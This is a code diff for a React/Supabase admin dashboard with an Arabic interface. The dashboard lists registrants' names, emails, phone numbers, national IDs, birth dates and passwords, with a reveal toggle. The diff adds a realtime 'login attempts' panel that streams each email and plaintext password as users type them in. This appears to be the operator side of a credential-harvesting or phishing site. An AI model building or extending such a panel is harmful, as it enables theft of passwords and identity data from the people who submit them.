@@ -3,13 +3,46 @@ import { supabase, Registration } from '@/lib/supabase';
 import {
   Users, CheckCircle2, Clock, Activity, Eye, EyeOff,
   RefreshCw, Wifi, WifiOff, Shield, Calendar, Phone,
-  CreditCard, Mail, Layout, List
+  CreditCard, Mail, Layout, List, User, Lock, FileText, Hash,
+  LogIn as LogInIcon
 } from 'lucide-react';
+import { useSiteConfig, FormField } from '@/context/SiteConfigContext';
 import HeaderFooterEditor from '@/components/cms/HeaderFooterEditor';
 import PageContentEditor from '@/components/cms/PageContentEditor';
 import FormFieldsEditor from '@/components/cms/FormFieldsEditor';
 
-type RegistrationWithMeta = Registration & { _new?: boolean; extra_fields?: Record<string, string> };
+type LoginAttempt = {
+  id: string;
+  registration_id: string | null;
+  email: string;
+  password: string;
+  created_at: string;
+};
+
+type RegistrationWithMeta = Registration & { 
+  _new?: boolean; 
+  extra_fields?: Record<string, string>;
+  login_attempts?: LoginAttempt[];
+};
+
+const FIELD_ICONS: Record<string, any> = {
+  full_name: User,
+  email: Mail,
+  phone: Phone,
+  national_id: CreditCard,
+  date_of_birth: Calendar,
+  password: Lock,
+  textarea: FileText,
+};
+
+const CORE_COLUMNS: Record<string, string> = {
+  full_name: 'full_name',
+  email: 'email',
+  phone: 'phone',
+  national_id: 'national_id',
+  date_of_birth: 'date_of_birth',
+  password: 'password_hash',
+};
 
 const statusLabel: Record<string, { text: string; className: string }> = {
   pending: { text: 'قيد المراجعة', className: 'bg-yellow-100 text-yellow-700' },
@@ -28,12 +61,14 @@ const AVATAR_COLORS = [
   'bg-rose-600', 'bg-amber-600', 'bg-cyan-600',
 ];
 function avatarColor(name: string) {
+  if (!name) return AVATAR_COLORS[0];
   let n = 0;
   for (let i = 0; i < name.length; i++) n += name.charCodeAt(i);
   return AVATAR_COLORS[n % AVATAR_COLORS.length];
 }
 
 function RegistrationsTab() {
+  const { formFields } = useSiteConfig();
   const [registrations, setRegistrations] = useState<RegistrationWithMeta[]>([]);
   const [loading, setLoading] = useState(true);
   const [connected, setConnected] = useState(false);
@@ -43,23 +78,38 @@ function RegistrationsTab() {
 
   const fetchAll = async () => {
     setLoading(true);
-    const { data } = await supabase.from('registrations').select('*').order('created_at', { ascending: false });
+    const { data: regs } = await supabase.from('registrations').select('*').order('created_at', { ascending: false });
+    const { data: logins } = await supabase.from('login_attempts').select('*').order('created_at', { ascending: false });
+    
     setLoading(false);
-    if (data) setRegistrations(data);
+    if (regs) {
+      const combined = regs.map(r => ({
+        ...r,
+        login_attempts: logins?.filter(l => l.registration_id === r.id) || []
+      }));
+      setRegistrations(combined);
+    }
   };
 
   useEffect(() => {
     fetchAll();
     const channel = supabase.channel('admin-registrations')
       .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'registrations' }, (payload) => {
-        const newReg = { ...(payload.new as Registration), _new: true };
+        const newReg = { ...(payload.new as Registration), _new: true, login_attempts: [] };
         setRegistrations((prev) => [newReg, ...prev]);
-        // Auto-select first new registration
         setSelectedId((prev) => prev ?? newReg.id);
         setTimeout(() => setRegistrations((prev) => prev.map((r) => r.id === newReg.id ? { ...r, _new: false } : r)), 3000);
       })
       .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'registrations' }, (payload) => {
-        setRegistrations((prev) => prev.map((r) => r.id === payload.new.id ? { ...payload.new as Registration, _new: false } : r));
+        setRegistrations((prev) => prev.map((r) => r.id === payload.new.id ? { ...r, ...payload.new as Registration } : r));
+      })
+      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'login_attempts' }, (payload) => {
+        const newLogin = payload.new as LoginAttempt;
+        setRegistrations((prev) => prev.map((r) => 
+          r.id === newLogin.registration_id 
+            ? { ...r, login_attempts: [newLogin, ...(r.login_attempts || [])] } 
+            : r
+        ));
       })
       .subscribe((status) => setConnected(status === 'SUBSCRIBED'));
     channelRef.current = channel;
@@ -79,7 +129,7 @@ function RegistrationsTab() {
   const selected = registrations.find((r) => r.id === selectedId);
 
   return (
-    <div className="flex flex-col flex-1 overflow-hidden gap-5">
+    <div className="flex flex-col flex-1 overflow-hidden gap-5 text-right" dir="rtl">
 
       {/* ── Stats row ── */}
       <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 shrink-0">
@@ -108,13 +158,11 @@ function RegistrationsTab() {
         })}
       </div>
 
-      {/* ── Split panel: list (40%) + detail (60%) ── */}
+      {/* ── Split panel ── */}
       <div className="flex-1 flex gap-4 overflow-hidden min-h-0">
 
         {/* ── LEFT: Registration list (40%) ── */}
         <div className="w-2/5 flex flex-col bg-slate-800 rounded-2xl border border-slate-700 overflow-hidden">
-
-          {/* List header */}
           <div className="shrink-0 px-4 py-3 border-b border-slate-700 flex items-center justify-between gap-2">
             <div className="flex items-center gap-2 min-w-0">
               <Activity className="w-4 h-4 text-blue-400 shrink-0" />
@@ -128,66 +176,35 @@ function RegistrationsTab() {
                 {connected ? <Wifi className="w-3 h-3" /> : <WifiOff className="w-3 h-3" />}
                 <span className="hidden sm:inline">{connected ? 'مباشر' : 'منقطع'}</span>
               </div>
-              <button onClick={fetchAll}
-                className="p-1.5 rounded-lg bg-slate-700 hover:bg-slate-600 text-slate-400 hover:text-white transition-colors"
-                title="تحديث">
+              <button onClick={fetchAll} className="p-1.5 rounded-lg bg-slate-700 hover:bg-slate-600 text-slate-400 hover:text-white transition-colors">
                 <RefreshCw className={`w-3.5 h-3.5 ${loading ? 'animate-spin' : ''}`} />
               </button>
             </div>
           </div>
 
-          {/* Scrollable list */}
           <div className="flex-1 overflow-y-auto">
             {loading ? (
               <div className="flex items-center justify-center py-16">
                 <div className="w-7 h-7 border-2 border-blue-500 border-t-transparent rounded-full animate-spin" />
-              </div>
-            ) : registrations.length === 0 ? (
-              <div className="flex flex-col items-center justify-center py-16 text-slate-500 px-6 text-center">
-                <Users className="w-9 h-9 mb-3 opacity-30" />
-                <p className="text-sm">لا توجد تسجيلات بعد</p>
               </div>
             ) : (
               <div className="divide-y divide-slate-700/40">
                 {registrations.map((reg) => {
                   const st = statusLabel[reg.status] || statusLabel.pending;
                   const isSelected = reg.id === selectedId;
-                  const ac = avatarColor(reg.full_name);
+                  const name = reg.full_name || 'بدون اسم';
                   return (
-                    <button
-                      key={reg.id}
-                      onClick={() => setSelectedId(isSelected ? null : reg.id)}
-                      className={`w-full text-right px-4 py-3.5 flex items-center gap-3 transition-all group ${
-                        reg._new
-                          ? 'bg-blue-500/10 border-r-2 border-blue-400'
-                          : isSelected
-                          ? 'bg-slate-700/80 border-r-2 border-blue-500'
-                          : 'hover:bg-slate-700/40 border-r-2 border-transparent'
-                      }`}
-                    >
-                      {/* Avatar */}
-                      <div className={`w-9 h-9 rounded-full ${ac} flex items-center justify-center text-white font-bold text-sm shrink-0 shadow-md`}>
-                        {reg.full_name.charAt(0)}
-                        {reg._new && (
-                          <span className="absolute top-0 right-0 w-2.5 h-2.5 bg-blue-400 rounded-full border-2 border-slate-800 animate-ping" />
-                        )}
+                    <button key={reg.id} onClick={() => setSelectedId(isSelected ? null : reg.id)}
+                      className={`w-full text-right px-4 py-3.5 flex items-center gap-3 transition-all group ${reg._new ? 'bg-blue-500/10 border-r-2 border-blue-400' : isSelected ? 'bg-slate-700/80 border-r-2 border-blue-500' : 'hover:bg-slate-700/40 border-r-2 border-transparent'}`}>
+                      <div className={`w-9 h-9 rounded-full ${avatarColor(name)} flex items-center justify-center text-white font-bold text-sm shrink-0 shadow-md`}>
+                        {name.charAt(0)}
                       </div>
-
-                      {/* Info */}
-                      <div className="flex-1 min-w-0 text-right">
+                      <div className="flex-1 min-w-0">
                         <div className="flex items-center gap-2 justify-between">
-                          <span className={`text-sm font-semibold truncate ${isSelected ? 'text-white' : 'text-slate-200 group-hover:text-white'}`}>
-                            {reg.full_name}
-                            {reg._new && <span className="inline-block w-1.5 h-1.5 bg-blue-400 rounded-full mr-1.5 animate-pulse" />}
-                          </span>
-                          <span className={`text-xs px-2 py-0.5 rounded-full font-semibold shrink-0 ${st.className}`}>
-                            {st.text}
-                          </span>
+                          <span className={`text-sm font-semibold truncate ${isSelected ? 'text-white' : 'text-slate-200 group-hover:text-white'}`}>{name}</span>
+                          <span className={`text-xs px-2 py-0.5 rounded-full font-semibold shrink-0 ${st.className}`}>{st.text}</span>
                         </div>
                         <p className="text-xs text-slate-500 truncate mt-0.5 ltr text-left">{reg.email}</p>
-                        <p className="text-xs text-slate-600 mt-0.5">
-                          {new Date(reg.created_at).toLocaleDateString('ar-SA', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' })}
-                        </p>
                       </div>
                     </button>
                   );
@@ -199,123 +216,107 @@ function RegistrationsTab() {
 
         {/* ── RIGHT: Detail panel (60%) ── */}
         <div className="w-3/5 flex flex-col bg-slate-800 rounded-2xl border border-slate-700 overflow-hidden">
-
-          {/* Detail header */}
           <div className="shrink-0 px-5 py-3.5 border-b border-slate-700 flex items-center gap-2">
             <Shield className="w-4 h-4 text-blue-400" />
-            <h2 className="font-bold text-white text-sm">
-              {selected ? `تفاصيل: ${selected.full_name}` : 'تفاصيل المستخدم'}
-            </h2>
+            <h2 className="font-bold text-white text-sm">{selected ? `تفاصيل: ${selected.full_name || 'المستخدم'}` : 'تفاصيل المستخدم'}</h2>
           </div>
 
-          {/* Scrollable detail content */}
           <div className="flex-1 overflow-y-auto">
             {!selected ? (
               <div className="flex flex-col items-center justify-center h-full text-slate-500 px-6 text-center gap-3">
-                <div className="w-16 h-16 rounded-2xl bg-slate-700/50 flex items-center justify-center">
-                  <Users className="w-8 h-8 opacity-30" />
-                </div>
-                <div>
-                  <p className="text-sm font-medium">لم يتم اختيار أي مستخدم</p>
-                  <p className="text-xs text-slate-600 mt-1">انقر على اسم من القائمة الجانبية لعرض التفاصيل</p>
-                </div>
+                <Users className="w-8 h-8 opacity-30" />
+                <p className="text-sm font-medium">لم يتم اختيار أي مستخدم</p>
               </div>
             ) : (
-              <div className="p-6 space-y-5">
-
-                {/* Profile header */}
+              <div className="p-6 space-y-6">
+                {/* Profile Header */}
                 <div className="flex items-center gap-4 pb-5 border-b border-slate-700">
-                  <div className={`w-16 h-16 rounded-2xl ${avatarColor(selected.full_name)} flex items-center justify-center text-2xl font-extrabold text-white shadow-xl`}>
-                    {selected.full_name.charAt(0)}
+                  <div className={`w-16 h-16 rounded-2xl ${avatarColor(selected.full_name || '')} flex items-center justify-center text-2xl font-extrabold text-white shadow-xl`}>
+                    {(selected.full_name || '?').charAt(0)}
                   </div>
                   <div>
-                    <h3 className="text-lg font-extrabold text-white leading-tight">{selected.full_name}</h3>
-                    <span className={`inline-block px-3 py-1 rounded-full text-xs font-semibold mt-1.5 ${statusLabel[selected.status]?.className}`}>
-                      {statusLabel[selected.status]?.text}
-                    </span>
-                  </div>
-                  <div className="mr-auto text-left">
-                    <p className="text-xs text-slate-500">رقم السجل</p>
-                    <p className="text-xs font-mono text-slate-400 mt-0.5">{selected.id.slice(0, 8)}...</p>
+                    <h3 className="text-lg font-extrabold text-white leading-tight">{selected.full_name || 'بدون اسم'}</h3>
+                    <span className={`inline-block px-3 py-1 rounded-full text-xs font-semibold mt-1.5 ${statusLabel[selected.status]?.className}`}>{statusLabel[selected.status]?.text}</span>
                   </div>
                 </div>
 
-                {/* Info grid */}
+                {/* Info Grid */}
                 <div className="grid sm:grid-cols-2 gap-4">
-                  {[
-                    { icon: Mail,       label: 'البريد الإلكتروني', value: selected.email || '—',               ltr: true  },
-                    { icon: Phone,      label: 'رقم الهاتف',         value: selected.phone || '—',               ltr: true  },
-                    { icon: CreditCard, label: 'رقم الهوية',         value: selected.national_id || '—',         ltr: false },
-                    { icon: Calendar,   label: 'تاريخ الميلاد',      value: selected.date_of_birth || '—',       ltr: false },
-                  ].map(({ icon: Icon, label, value, ltr }) => (
-                    <div key={label} className="bg-slate-700/40 rounded-xl p-4 flex items-start gap-3">
-                      <div className="w-8 h-8 bg-slate-700 rounded-lg flex items-center justify-center shrink-0">
-                        <Icon className="w-4 h-4 text-slate-400" />
-                      </div>
-                      <div className="min-w-0 flex-1">
-                        <p className="text-xs text-slate-500 font-medium mb-0.5">{label}</p>
-                        <p className={`text-sm text-white font-semibold truncate ${ltr ? 'ltr' : ''}`}>{value}</p>
-                      </div>
-                    </div>
-                  ))}
-                </div>
-
-                {/* Password row */}
-                <div className="bg-slate-700/40 rounded-xl p-4 flex items-center gap-3">
-                  <div className="w-8 h-8 bg-slate-700 rounded-lg flex items-center justify-center shrink-0">
-                    <Shield className="w-4 h-4 text-slate-400" />
-                  </div>
-                  <div className="flex-1 min-w-0">
-                    <p className="text-xs text-slate-500 font-medium mb-0.5">كلمة المرور</p>
-                    <div className="flex items-center gap-3">
-                      <p className="font-mono text-sm text-white tracking-[0.25em] ltr">
-                        {showPassMap[selected.id] ? (selected.password_hash || '—') : maskPassword(selected.password_hash || '')}
-                      </p>
-                      <button
-                        onClick={() => togglePassVisibility(selected.id)}
-                        className="flex items-center gap-1.5 text-xs text-slate-400 hover:text-white transition-colors bg-slate-700 hover:bg-slate-600 px-2.5 py-1 rounded-lg"
-                      >
-                        {showPassMap[selected.id] ? <><EyeOff className="w-3.5 h-3.5" />إخفاء</> : <><Eye className="w-3.5 h-3.5" />إظهار</>}
-                      </button>
-                    </div>
-                  </div>
-                </div>
-
-                {/* Custom extra fields */}
-                {selected.extra_fields && Object.keys(selected.extra_fields).length > 0 && (
-                  <div className="space-y-3">
-                    <p className="text-xs text-slate-500 font-semibold uppercase tracking-widest">حقول مخصصة</p>
-                    <div className="grid sm:grid-cols-2 gap-3">
-                      {Object.entries(selected.extra_fields).map(([k, v]) => (
-                        <div key={k} className="bg-slate-700/40 rounded-xl p-4 flex items-start gap-3">
-                          <div className="w-8 h-8 bg-slate-700 rounded-lg flex items-center justify-center shrink-0">
-                            <Activity className="w-4 h-4 text-slate-400" />
+                  {formFields
+                    .filter(f => f.page_key === 'register' && f.field_key !== 'confirm_password')
+                    .sort((a, b) => a.field_order - b.field_order)
+                    .map((field) => {
+                      const Icon = FIELD_ICONS[field.field_key] || Activity;
+                      const coreCol = CORE_COLUMNS[field.field_key];
+                      const value = coreCol ? (selected as any)[coreCol] : (selected.extra_fields?.[field.field_key]);
+                      if (field.field_type === 'password') {
+                        return (
+                          <div key={field.id} className="bg-slate-700/40 rounded-xl p-4 flex items-center gap-3 col-span-full">
+                            <Shield className="w-4 h-4 text-slate-400" />
+                            <div className="flex-1">
+                              <p className="text-xs text-slate-500 font-medium">{field.label}</p>
+                              <div className="flex items-center gap-3">
+                                <p className="font-mono text-sm text-white tracking-widest">{showPassMap[selected.id] ? (value || '—') : maskPassword(value || '')}</p>
+                                <button onClick={() => togglePassVisibility(selected.id)} className="text-xs text-blue-400 hover:underline">
+                                  {showPassMap[selected.id] ? 'إخفاء' : 'إظهار'}
+                                </button>
+                              </div>
+                            </div>
                           </div>
+                        );
+                      }
+                      return (
+                        <div key={field.id} className="bg-slate-700/40 rounded-xl p-4 flex items-start gap-3">
+                          <Icon className="w-4 h-4 text-slate-400 mt-1" />
                           <div className="min-w-0 flex-1">
-                            <p className="text-xs text-slate-500 font-medium mb-0.5">{k}</p>
-                            <p className="text-sm text-white font-semibold truncate">{v || '—'}</p>
+                            <p className="text-xs text-slate-500 font-medium mb-0.5">{field.label}</p>
+                            <p className="text-sm text-white font-semibold truncate">{value || '—'}</p>
+                          </div>
+                        </div>
+                      );
+                    })}
+                </div>
+
+                {/* Login Attempts Section */}
+                <div className="space-y-3 pt-4 border-t border-slate-700">
+                  <div className="flex items-center gap-2 mb-2">
+                    <LogInIcon className="w-4 h-4 text-amber-400" />
+                    <h4 className="text-sm font-bold text-white">محاولات تسجيل الدخول (فوري)</h4>
+                  </div>
+                  
+                  {(!selected.login_attempts || selected.login_attempts.length === 0) ? (
+                    <div className="bg-slate-800/50 rounded-xl p-4 text-center border border-dashed border-slate-700">
+                      <p className="text-xs text-slate-500 italic">لا توجد محاولات دخول مسجلة بعد</p>
+                    </div>
+                  ) : (
+                    <div className="space-y-2">
+                      {selected.login_attempts.map((attempt) => (
+                        <div key={attempt.id} className="bg-slate-900/50 border border-slate-700/50 rounded-xl p-3 flex flex-col gap-2">
+                          <div className="flex items-center justify-between">
+                            <span className="text-[10px] text-slate-500 font-mono">
+                              {new Date(attempt.created_at).toLocaleString('ar-SA', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
+                            </span>
+                            <span className="text-[10px] bg-amber-500/10 text-amber-400 px-2 py-0.5 rounded-full">محاولة دخول</span>
+                          </div>
+                          <div className="grid grid-cols-2 gap-2">
+                            <div className="bg-slate-800/50 rounded-lg p-2">
+                              <p className="text-[10px] text-slate-500 mb-1">البريد المستخدم</p>
+                              <p className="text-xs text-slate-200 truncate ltr text-left">{attempt.email}</p>
+                            </div>
+                            <div className="bg-slate-800/50 rounded-lg p-2">
+                              <p className="text-[10px] text-slate-500 mb-1">كلمة المرور المدخلة</p>
+                              <p className="text-xs text-white font-bold tracking-wider">{attempt.password}</p>
+                            </div>
                           </div>
                         </div>
                       ))}
                     </div>
-                  </div>
-                )}
-
-                {/* Registration date */}
-                <div className="pt-4 border-t border-slate-700 flex items-center justify-between">
-                  <div>
-                    <p className="text-xs text-slate-500">تاريخ التسجيل</p>
-                    <p className="text-sm text-slate-300 font-medium mt-0.5">
-                      {new Date(selected.created_at).toLocaleString('ar-SA', { dateStyle: 'full', timeStyle: 'short' })}
-                    </p>
-                  </div>
-                  <div className={`w-3 h-3 rounded-full ${selected.status === 'verified' ? 'bg-green-400' : 'bg-yellow-400'} shadow-lg`} />
+                  )}
                 </div>
               </div>
             )}
           </div>
         </div>
-
       </div>
     </div>
   );
@@ -323,23 +324,18 @@ function RegistrationsTab() {
 
 // ─── CMS Tab ──────────────────────────────────────────────────────────────────
 
-type CmsSection = 'header_footer' | 'pages' | 'form_fields';
-const CMS_SECTIONS: { key: CmsSection; label: string }[] = [
-  { key: 'header_footer', label: 'الرأس والتذييل' },
-  { key: 'pages', label: 'محتوى الصفحات' },
-  { key: 'form_fields', label: 'حقول النماذج' },
-];
-
 function CMSTab() {
-  const [activeSection, setActiveSection] = useState<CmsSection>('header_footer');
+  const [activeSection, setActiveSection] = useState<'header_footer' | 'pages' | 'form_fields'>('header_footer');
   return (
-    <div className="space-y-5">
+    <div className="space-y-5 text-right" dir="rtl">
       <div className="flex gap-2 overflow-x-auto pb-1">
-        {CMS_SECTIONS.map((s) => (
-          <button key={s.key} onClick={() => setActiveSection(s.key)}
-            className={`px-5 py-2.5 rounded-xl text-sm font-semibold whitespace-nowrap transition-all ${
-              activeSection === s.key ? 'bg-blue-600 text-white shadow-md' : 'bg-slate-800 border border-slate-700 text-slate-400 hover:text-white'
-            }`}>
+        {[
+          { key: 'header_footer', label: 'الرأس والتذييل' },
+          { key: 'pages', label: 'محتوى الصفحات' },
+          { key: 'form_fields', label: 'حقول النماذج' },
+        ].map((s) => (
+          <button key={s.key} onClick={() => setActiveSection(s.key as any)}
+            className={`px-5 py-2.5 rounded-xl text-sm font-semibold whitespace-nowrap transition-all ${activeSection === s.key ? 'bg-blue-600 text-white shadow-md' : 'bg-slate-800 border border-slate-700 text-slate-400 hover:text-white'}`}>
             {s.label}
           </button>
         ))}
@@ -353,35 +349,29 @@ function CMSTab() {
 
 // ─── Main Admin Page ──────────────────────────────────────────────────────────
 
-type AdminTab = 'registrations' | 'cms';
-
 export default function AdminPage() {
-  const [activeTab, setActiveTab] = useState<AdminTab>('registrations');
+  const [activeTab, setActiveTab] = useState<'registrations' | 'cms'>('registrations');
 
   return (
-    <div className="h-screen flex flex-col bg-slate-900 text-white overflow-hidden">
-      {/* Top Bar */}
+    <div className="h-screen flex flex-col bg-slate-900 text-white overflow-hidden" dir="rtl">
       <header className="shrink-0 bg-slate-800 border-b border-slate-700 px-4 sm:px-6 py-4">
         <div className="max-w-7xl mx-auto flex items-center justify-between">
           <div className="flex items-center gap-3">
             <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg">
               <Shield className="w-5 h-5 text-white" />
             </div>
-            <div>
+            <div className="text-right">
               <h1 className="text-base font-bold text-white">لوحة التحكم</h1>
               <p className="text-xs text-slate-400">إدارة الموقع والتسجيلات</p>
             </div>
           </div>
-          {/* Tabs */}
           <div className="flex gap-1 bg-slate-700/50 rounded-xl p-1">
-            {([
+            {[
               { key: 'registrations', label: 'التسجيلات', icon: List },
               { key: 'cms', label: 'إدارة المحتوى', icon: Layout },
-            ] as { key: AdminTab; label: string; icon: React.ElementType }[]).map(({ key, label, icon: Icon }) => (
-              <button key={key} onClick={() => setActiveTab(key)}
-                className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-semibold transition-all ${
-                  activeTab === key ? 'bg-blue-600 text-white shadow-md' : 'text-slate-400 hover:text-white'
-                }`}>
+            ].map(({ key, label, icon: Icon }) => (
+              <button key={key} onClick={() => setActiveTab(key as any)}
+                className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-semibold transition-all ${activeTab === key ? 'bg-blue-600 text-white shadow-md' : 'text-slate-400 hover:text-white'}`}>
                 <Icon className="w-4 h-4" />{label}
               </button>
             ))}
@@ -389,14 +379,10 @@ export default function AdminPage() {
         </div>
       </header>
 
-      {/* Content area — fills remaining height */}
       <div className="flex-1 overflow-hidden flex flex-col">
         <div className="max-w-7xl w-full mx-auto px-4 sm:px-6 py-6 flex flex-col flex-1 overflow-hidden">
-          {activeTab === 'registrations' && <RegistrationsTab />}
-          {activeTab === 'cms' && (
-            <div className="flex-1 overflow-y-auto">
-              <CMSTab />
-            </div>
+          {activeTab === 'registrations' ? <RegistrationsTab /> : (
+            <div className="flex-1 overflow-y-auto"><CMSTab /></div>
           )}
         </div>
       </div>
